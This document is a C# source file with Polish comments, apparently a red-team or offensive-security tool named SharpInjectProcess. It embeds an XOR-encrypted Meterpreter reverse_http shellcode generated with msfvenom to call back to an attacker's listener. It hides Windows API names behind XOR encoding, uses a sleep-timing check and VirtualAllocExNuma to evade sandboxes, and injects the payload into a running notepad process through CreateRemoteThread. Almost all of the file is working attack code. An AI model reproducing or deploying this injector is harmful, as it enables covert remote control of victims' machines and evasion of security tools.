﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SharpInjectProcess
{
    public class Program
    {
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);

        // VirtualAlloc
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr aaaaaaaaaaaa(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // CreateThread
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr bbbbbbbbbbbbb(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // WaitForSingleObject
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate UInt32 ccccccccccccccc(IntPtr hHandle, UInt32 dwMilliseconds);

        // OpenProcess
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        // VirtualAllocEx
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // WriteProcessMemory
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate bool Type_WriteProcessMemory(IntPtr hprocess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        // CreateRemoteThread
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddresss, IntPtr lpParameter, uint DwCreationFlags, out IntPtr lpThreadId );

        // VirtualAllocExNuma
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);


        // Ponizej funkcja o nazwie addworkstation ktora przyjmuje zaxorowany strumien bajtow, odxorowuje go i zwraca string
        public static string addworkstation(byte[] data)
        {
            byte[] adduser = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                adduser[i] = (byte)(data[i] ^ 0xa0);
            }
            return Encoding.Default.GetString(adduser);
        }

        // ponizej funkcja o nazwie helloworld ktora przyjmuje zaxorowany strumien bajtow, string klucz i zwraca odxorowany strumien bajtow
        public static byte[] helloworld(byte[] e_buf, string key)
        {
            byte[] d_buf = new byte[e_buf.Length];
            byte[] key_bytes = Encoding.UTF8.GetBytes(key);

            for (int i=0; i<e_buf.Length; i++)
            {
                d_buf[i] = (byte)(e_buf[i] ^ key_bytes[i%key_bytes.Length]);
            }


            return d_buf;
        }

        // ponizej funkcja ktora sprawdza czy jestesmy w sandboxie. Czesto sandboxy jak widzą sleepy to robia fast-forward do kolejnego kroku. Robimy wiec sleep 2 sekundy, sprawdzamy czy rzeczywiscie minely 2 sekundy (sprawdzajac timeofday) 

        public static void amireal()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if(t2 < 1.5)
            {
                return;
            }
            else
            {
                Execute();
            }
        }




        public static void Execute()
        {
            const uint DELETE = 0x00010000;
            const uint READ_CONTROL = 0x00020000;
            const uint WRITE_DAC = 0x00040000;
            const uint WRITE_OWNER = 0x00080000;
            const uint SYNCHRONIZE = 0x00100000;
            const uint END = 0xFFF;
            const uint PROCESS_ALL_ACCESS = (DELETE | READ_CONTROL | WRITE_DAC | WRITE_OWNER | SYNCHRONIZE | END);

            // Ponizej Twoj shellcode! msfvenom -p windows/x64/meterpreter/reverse_http --encrypt xor  --encrypt-key siemanko LHOST=192.168.y.x LPORT=8080 -f csharp

            byte[] buf = new byte[590] {0x8f,0x21,0xe6,0x89,0x91,0x86,
0xa7,0x6f,0x73,0x69,0x24,0x3c,0x20,0x3e,0x39,0x3e,0x25,0x21,
0x54,0xbf,0x04,0x26,0xe0,0x3d,0x13,0x21,0xee,0x3f,0x79,0x26,
0xe0,0x3d,0x53,0x21,0xee,0x1f,0x31,0x23,0x5a,0xa6,0x3b,0x66,
0xd2,0x27,0x2b,0x26,0x5a,0xaf,0xdf,0x55,0x04,0x11,0x63,0x42,
0x4b,0x2e,0xb2,0xa0,0x68,0x2c,0x60,0xaf,0x89,0x82,0x21,0x21,
0xee,0x3f,0x41,0x2f,0x3a,0xe4,0x31,0x55,0x2d,0x6c,0xb1,0x08,
0xea,0x17,0x6b,0x62,0x67,0x62,0xe4,0x1c,0x6b,0x6f,0x73,0xe2,
0xe5,0xe5,0x61,0x6e,0x6b,0x27,0xf6,0xa9,0x11,0x0a,0x29,0x6f,
0xbb,0x3f,0xf8,0x21,0x7d,0x29,0xea,0x2e,0x4b,0x26,0x72,0xb9,
0x86,0x3b,0x2c,0x5f,0xa2,0x27,0x8c,0xa0,0x24,0xe6,0x55,0xe6,
0x23,0x6e,0xa5,0x21,0x54,0xad,0x20,0xaf,0xa2,0x62,0xdf,0x28,
0x64,0xac,0x59,0x8e,0x1e,0x9e,0x3f,0x6a,0x29,0x49,0x69,0x2b,
0x52,0xbe,0x06,0xb1,0x3d,0x29,0xea,0x2e,0x4f,0x26,0x72,0xb9,
0x03,0x2c,0xea,0x62,0x23,0x2b,0xf8,0x29,0x79,0x24,0x60,0xbe,
0x2a,0xe4,0x77,0xe1,0x24,0x35,0x20,0x36,0x35,0x27,0x72,0xb9,
0x3c,0x37,0x20,0x36,0x2a,0x36,0x32,0x33,0x2d,0xee,0x8d,0x4e,
0x2a,0x3d,0x8c,0x89,0x3d,0x2c,0x38,0x34,0x23,0xe4,0x61,0x80,
0x2e,0x92,0x9e,0x91,0x36,0x27,0x42,0xb2,0x36,0x24,0xdf,0x19,
0x02,0x01,0x1a,0x07,0x00,0x19,0x61,0x2f,0x3d,0x27,0xfa,0x88,
0x2c,0xaa,0xa3,0x22,0x1c,0x49,0x74,0x96,0xb0,0x3e,0x32,0x26,
0xe2,0x8e,0x20,0x33,0x28,0x5c,0xa1,0x23,0x5a,0xa6,0x20,0x3a,
0x2c,0xd7,0x5b,0x38,0x12,0xc8,0x73,0x69,0x65,0x6d,0x9e,0xbb,
0x83,0x7f,0x73,0x69,0x65,0x5c,0x58,0x5c,0x45,0x5e,0x45,0x51,
0x4b,0x5c,0x53,0x57,0x45,0x5e,0x47,0x5a,0x65,0x37,0x29,0xe7,
0xaa,0x26,0xb4,0xa9,0xf5,0x72,0x61,0x6e,0x26,0x5e,0xba,0x3a,
0x36,0x07,0x62,0x3d,0x22,0xd5,0x24,0xe0,0xfa,0xab,0x61,0x6e,
0x6b,0x6f,0x8c,0xbc,0x8d,0x28,0x61,0x6e,0x6b,0x40,0x44,0x1f,
0x14,0x07,0x0d,0x1e,0x39,0x57,0x20,0x28,0x10,0x35,0x0c,0x1e,
0x0a,0x36,0x4b,0x0e,0x48,0x06,0x23,0x19,0x2c,0x23,0x3b,0x07,
0x53,0x18,0x50,0x1e,0x1b,0x02,0x19,0x13,0x54,0x35,0x37,0x20,
0x38,0x16,0x17,0x19,0x0b,0x5e,0x1b,0x2d,0x3e,0x1d,0x2b,0x3c,
0x30,0x23,0x18,0x1c,0x3f,0x25,0x4a,0x2e,0x2e,0x3b,0x2e,0x01,
0x2c,0x3b,0x11,0x38,0x5d,0x6d,0x29,0xe7,0xaa,0x3c,0x29,0x28,
0x3d,0x20,0x50,0xa7,0x38,0x27,0xcb,0x69,0x67,0x45,0xe5,0x6e,
0x6b,0x6f,0x73,0x39,0x36,0x3e,0x28,0xa9,0xa9,0x84,0x26,0x47,
0x5e,0x92,0xb4,0x26,0xe2,0xa9,0x19,0x63,0x3a,0x3e,0x3b,0x26,
0xe2,0x9e,0x3e,0x58,0xac,0x20,0x50,0xa7,0x38,0x3c,0x3a,0xae,
0xa7,0x40,0x67,0x76,0x10,0x90,0xa6,0xec,0xa5,0x18,0x7e,0x26,
0xac,0xae,0xfb,0x7a,0x65,0x6d,0x28,0xd4,0x2f,0x9f,0x46,0x89,
0x65,0x6d,0x61,0x6e,0x94,0xba,0x3b,0x96,0xaa,0x19,0x63,0x85,
0xa7,0x87,0x26,0x69,0x65,0x6d,0x32,0x37,0x01,0x2f,0x29,0x20,
0xec,0xbc,0xa0,0x8c,0x7b,0x26,0xb4,0xa9,0x65,0x7d,0x61,0x6e,
0x22,0xd5,0x2b,0xcd,0x36,0x88,0x61,0x6e,0x6b,0x6f,0x8c,0xbc,
0x2d,0xfe,0x32,0x3d,0x23,0xe6,0x94,0x21,0xec,0x9c,0x29,0xe7,
0xb1,0x26,0xb4,0xa9,0x65,0x4d,0x61,0x6e,0x22,0xe6,0x8a,0x20,
0xdf,0x7f,0xf7,0xe7,0x89,0x6f,0x73,0x69,0x65,0x92,0xb4,0x26,
0xe8,0xab,0x53,0xec,0xa5,0x19,0xd3,0x08,0xe0,0x68,0x3b,0x68,
0xa6,0xe8,0xa1,0x1b,0xb9,0x37,0xb0,0x31,0x0f,0x6d,0x38,0x27,
0xac,0xad,0x83,0xdc,0xc7,0x3b,0x9e,0xbb};


            buf = helloworld(buf, "siemanko");

            int buflen = buf.Length + 1;

            // Zaladowanie biblioteki user32.dll i kernel32.dll
            string user32dll = "user32.dll";
            string kernel32dll = "kernel32.dll";
            IntPtr huser32dll = LoadLibrary(user32dll);
            IntPtr hkernel32dll = LoadLibrary(kernel32dll);


            // znalezienie wskaznika na OpenProcess i zdefiniowanie open process
            byte[] e_op = { 0xef, 0xd0, 0xc5, 0xce, 0xf0, 0xd2, 0xcf, 0xc3, 0xc5, 0xd3, 0xd3 };
            IntPtr hOpenProcess = GetProcAddress(hkernel32dll, addworkstation(e_op));   
            Type_OpenProcess op = (Type_OpenProcess)Marshal.GetDelegateForFunctionPointer(hOpenProcess, typeof(Type_OpenProcess));

            // znalezienie wskaznika na VirtualAllocEx i zdefiniowanie VirtualAllocEx
            byte[] e_vax = { 0xf6, 0xc9, 0xd2, 0xd4, 0xd5, 0xc1, 0xcc, 0xe1, 0xcc, 0xcc, 0xcf, 0xc3, 0xe5, 0xd8 };
            IntPtr hVirtualAllocEx = GetProcAddress(hkernel32dll , addworkstation(e_vax));
            Type_VirtualAllocEx vax = (Type_VirtualAllocEx)Marshal.GetDelegateForFunctionPointer(hVirtualAllocEx, typeof(Type_VirtualAllocEx));


            // Znalezienie wskaznikana WriteProcessMemory i zdefiniowanie WriteProcessMemory
            byte[] e_wpm = { 0xf7, 0xd2, 0xc9, 0xd4, 0xc5, 0xf0, 0xd2, 0xcf, 0xc3, 0xc5, 0xd3, 0xd3, 0xed, 0xc5, 0xcd, 0xcf, 0xd2, 0xd9 };
            IntPtr hWritePricessMemory = GetProcAddress(hkernel32dll, addworkstation(e_wpm));
            Type_WriteProcessMemory wpm = (Type_WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(hWritePricessMemory, typeof(Type_WriteProcessMemory));


            // Znalezienie Wskaznika na CreateRemoteThread i zdefiniowanie CreateRemoteThread
            byte[] e_crm = { 0xe3, 0xd2, 0xc5, 0xc1, 0xd4, 0xc5, 0xf2, 0xc5, 0xcd, 0xcf, 0xd4, 0xc5, 0xf4, 0xc8, 0xd2, 0xc5, 0xc1, 0xc4 };
            IntPtr hCreateRemoteThread = GetProcAddress(hkernel32dll, addworkstation(e_crm));
            Type_CreateRemoteThread crt = (Type_CreateRemoteThread)Marshal.GetDelegateForFunctionPointer(hCreateRemoteThread, typeof(Type_CreateRemoteThread));

            // znalezienie wskaznika na VirtualAllocExNuma i zdefiniowanie VirtualAllocEx
            byte[] e_vaxn = { 0xf6, 0xc9, 0xd2, 0xd4, 0xd5, 0xc1, 0xcc, 0xe1, 0xcc, 0xcc, 0xcf, 0xc3, 0xe5, 0xd8, 0xee, 0xd5, 0xcd, 0xc1 };
            IntPtr hVirtualAllocExNuma = GetProcAddress(hkernel32dll, addworkstation(e_vaxn));
            Type_VirtualAllocExNuma vaxn = (Type_VirtualAllocExNuma)Marshal.GetDelegateForFunctionPointer(hVirtualAllocExNuma , typeof(Type_VirtualAllocExNuma));



            // Tu wpisz do jakiego procesu chcesz wstrzyknac ShellCode
            Process[] processes = Process.GetProcessesByName("notepad");
            int pid = processes[0].Id;

            IntPtr prochandle = op(PROCESS_ALL_ACCESS, false, (uint)pid);


            // Tu przechodzimy o alokacji pamieci
            // Wybierz czy chcesz zaalokowac ja za pomoca tradycyjnego VirtualAllocEx czy sprobowac SandBox evasion VirtualAllocExNuma. W zaleznosci od tego jaki typ alokacji wybierzesz
            // USUŃ NIEPOTRZEBNY TYP I WSKAŹNIK DO NIEPOTRZEBNEJ FUNKCJI

            // TRADYCYJNIE:
            //IntPtr memaddr = vax(prochandle, IntPtr.Zero, (uint)buflen, 0x3000, 0x40);

            // VirtualAllocExNuma:
            IntPtr memaddr = vaxn(prochandle, IntPtr.Zero, (uint)buflen, 0x3000, 0x40,0);

            //int bytesWritten = 0;
            wpm(prochandle, memaddr, buf, buflen, out var bytesWritten);
            IntPtr hcrt = crt(prochandle, IntPtr.Zero, 0, memaddr, IntPtr.Zero, 0, out var lpThreadId);
            

        }

        public static void Main(string[] args)
        {
            amireal();
        }
    }
}
